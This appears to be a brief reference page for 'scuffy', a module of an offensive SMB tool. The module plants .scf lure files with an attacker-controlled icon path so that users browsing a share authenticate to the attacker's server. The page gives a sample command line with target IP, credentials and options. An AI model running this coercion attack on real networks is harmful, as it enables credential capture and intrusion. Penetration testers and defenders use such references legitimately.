# scuffy

Drops .scf coercion lures with attacker icon (NAME=..., SERVER=..., CLEANUP=True)

Options: `CLEANUP=...`, `NAME=...`, `SERVER=...`

```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M scuffy -o CLEANUP=...,NAME=...,SERVER=...
```

Via Titanis (`SmbScuffyModule.cs`).
